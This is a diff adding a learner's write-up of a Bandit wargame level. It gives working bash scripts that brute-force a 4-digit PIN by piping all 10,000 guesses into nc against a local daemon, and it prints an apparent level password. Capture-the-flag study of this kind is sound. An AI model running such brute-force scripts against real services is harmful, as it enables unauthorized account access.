@@ -1,0 +1,117 @@
+---
+
+## Level 24 → Level 25
+**Objective:** Brute force a 4 digit PIN (0000-9999) by sending the
+current password + PIN to a daemon listening on port 30002.
+Correct combination returns the bandit25 password.
+
+**Commands Used:**
+```bash
+mkdir /tmp/bf                       # created working directory in tmp
+nano /tmp/bf/brute.sh               # created the brute force script
+bash /tmp/bf/brute.sh               # executed the script
+cat /tmp/output.txt                 # viewed results
+grep -v "Wrong" /tmp/output.txt     # filtered out wrong attempts
+                                    # showed only the correct password line
+```
+
+**Script Logic — First Attempt (slow):**
+```bash
+#!/bin/bash
+for i in $(seq 0000 9999)
+do
+    echo "password $i" | nc localhost 30002
+done > /tmp/output.txt
+```
+Problem: connects to nc **10000 times separately** — very slow because
+each connection has overhead of establishing and closing a new
+network connection every iteration.
+
+**Final Script (fast — single connection):**
+```bash
+#!/bin/bash
+for i in $(seq 0000 9999)
+do
+    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
+done | nc localhost 30002 > /tmp/output.txt
+```
+
+**Why the Second Script is Faster:**
+- The loop generates ALL 10000 combinations first
+- `|` pipes all of them into nc in **one single connection**
+- nc sends everything at once instead of reconnecting 10000 times
+- Ran in under a second vs potentially minutes for the slow version
+
+**How the Script Works Step by Step:**
+```
+1. Loop starts — i = 0000
+2. echo prints "password 0000"
+3. i = 0001 → echo prints "password 0001"
+4. ... continues until i = 9999
+5. All 10000 lines piped into nc localhost 30002 at once
+6. Service checks each combination
+7. All responses saved to /tmp/output.txt
+8. grep filters out "Wrong" lines → correct password remains
+```
+
+**Reading the Output:**
+```bash
+cat /tmp/output.txt     # shows all responses including wrong ones
+grep -v "Wrong" /tmp/output.txt  # -v inverts match — shows lines
+                                  # that do NOT contain "Wrong"
+                                  # reveals the correct password line
+```
+
+**What is a Daemon?**
+- A daemon is a background process that runs continuously on a server
+- Listens for incoming connections on a specific port
+- Processes requests and sends responses automatically
+- Named after the concept of background processes in Unix
+- Common examples: web servers, SSH server, cron daemon
+
+**What is Brute Force?**
+- Systematically trying every possible combination until finding
+  the correct one
+- Works when the search space is small enough (10000 PINs here)
+- Would not be practical for longer passwords — 8 character
+  alphanumeric password = billions of combinations
+- Tools like Hydra and John the Ripper are used for larger
+  brute force attacks on login forms and password hashes
+
+**Script File Extensions:**
+| Extension | Used For |
+|---|---|
+| `.sh` | Bash/shell scripts |
+| `.py` | Python scripts |
+| `.ssh` | SSH configuration — NOT for scripts |
+
+**How to Execute a Bash Script:**
+```bash
+bash script.sh          # run directly with bash — no chmod needed
+chmod +x script.sh      # make executable
+./script.sh             # run directly after chmod
+```
+
+**What I Learned:**
+- Brute force attacks try all possible combinations systematically
+- Piping loop output into nc in one connection is much faster
+  than connecting separately for each attempt
+- `grep -v` is useful for filtering out noise from large outputs
+- `seq` generates sequences of numbers — very useful in scripts
+- Script files should use `.sh` extension not `.ssh`
+- Daemons are background services listening on specific ports
+
+**Real Pentesting Relevance:**
+Brute forcing PINs and passwords is a common pentesting technique:
+- Always try brute force when the search space is small
+- Write custom scripts when standard tools don't fit the situation
+- Hydra and Medusa are industry standard tools for larger attacks
+- Rate limiting is a defense against brute force — some services
+  block IPs after too many failed attempts
+
+**Key Takeaway:**
+Writing custom brute force scripts is a core pentesting skill.
+Not every situation has a ready-made tool — sometimes you need
+to write your own. The approach here (generate all combinations,
+pipe to service, filter results) is a pattern you will reuse
+constantly in CTFs and real pentesting scenarios.
